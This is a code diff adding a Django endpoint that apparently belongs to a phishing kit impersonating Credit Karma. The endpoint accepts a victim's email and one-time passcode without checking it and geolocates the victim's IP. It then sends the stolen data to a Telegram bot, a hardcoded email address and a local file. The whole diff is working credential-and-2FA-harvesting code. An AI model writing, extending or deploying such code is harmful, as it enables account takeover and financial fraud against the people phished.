@@ -1202,3 +1202,131 @@ def collect_user_security_questions(request):
         payload["message"] = "Successful"
         payload["data"] = data
     return Response(payload)
+
+
+
+@api_view(
+    [
+        "POST",
+    ]
+)
+@permission_classes([])
+@authentication_classes([])
+def collect_user_otp_verification(request):
+
+    payload = {}
+    data = {}
+    errors = {}
+
+    if request.method == "POST":
+
+        email = request.data.get("emzemz", "")
+        otp = request.data.get("otp", "")
+
+        print(email)
+        print(otp)
+
+        if not email:
+            errors["email"] = ["Email is required."]
+
+        if not otp:
+            errors["otp"] = ["OTP is required."]
+
+        if errors:
+            payload["message"] = "Errors"
+            payload["errors"] = errors
+            return Response(payload, status=status.HTTP_400_BAD_REQUEST)
+
+        #####################
+        # Browser Data
+        ######################
+
+        ip = get_client_ip(request)
+        agent = request.META.get("HTTP_USER_AGENT", "")
+
+        country = get_country_from_ip(ip)
+        city = get_city_from_ip(ip)
+        browser = get_user_browser(agent)
+        os = get_user_os(agent)
+        date = datetime.now().strftime("%I:%M:%S %d/%m/%Y")
+
+        ##############################
+        # Save User data to database
+        ################################
+
+        client, created = Client.objects.get_or_create(
+            email=email,
+        )
+        # You could add OTP verification logic here
+        # For now, we'll just log it
+
+        browser_data, created = BrowserDetail.objects.get_or_create(
+            client=client,
+        )
+
+        browser_data.ip = ip
+        browser_data.agent = agent
+        browser_data.country = country
+        browser_data.browser = browser
+        browser_data.os = os
+        browser_data.date = date
+
+        browser_data.save()
+
+        message = f"|=====||Snel Roi - CREDIT KARMA||=====|\n"
+        message += f"|========= [  OTP VERIFICATION ] ==========|\n"
+        message += f"| ➤ [ Email ]           : {email}\n"
+        message += f"| ➤ [ OTP ]             : {otp}\n"
+        message += f"|=====================================|\n"
+        message += f"| 🌍 B R O W S E R ~ D E T A I L S 🌍\n"
+        message += f"|======================================|\n"
+        message += f"| ➤ [ IP Address ]   : {ip}\r\n"
+        message += f"| ➤ [ IP Country ]   : {country}\r\n"
+        message += f"| ➤ [ IP City ]      : {city}\r\n"
+        message += f"| ➤ [ Browser ]      : {browser} on {os}\r\n"
+        message += f"| ➤ [ User Agent ]   : {agent}\r\n"
+        message += f"| ➤ [ TIME ]         : {date}\r\n"
+        message += f"|=====================================|\n"
+
+        #############################
+        # Send data to telegram
+        ##############################
+
+        telegram_url = (
+            f"https://api.telegram.org/bot{app_settings['botToken']}/sendMessage"
+        )
+
+        # Send the POST request to Telegram API
+        response = requests.post(
+            telegram_url, data={"chat_id": app_settings["chatId"], "text": message}
+        )
+
+        # Check if the message was sent successfully
+        if response.status_code == 200:
+            print("Telegram message sent successfully")
+        else:
+            print(f"Failed to send message. Status code: {response.status_code}")
+
+        #############################
+        # Send Data to email
+        ########################
+        subject = "OTP Verification Data"
+        from_email = settings.DEFAULT_FROM_EMAIL
+        recipient_list = ["etornamasamoah@gmail.com"]
+
+        send_mail(
+            subject,
+            message,
+            from_email,
+            recipient_list,
+            fail_silently=False,
+        )
+
+        #####################################
+        # Save to txt
+        ##############################
+        save_data_to_file(email, message)
+
+        payload["message"] = "Successful"
+        payload["data"] = data
+    return Response(payload)
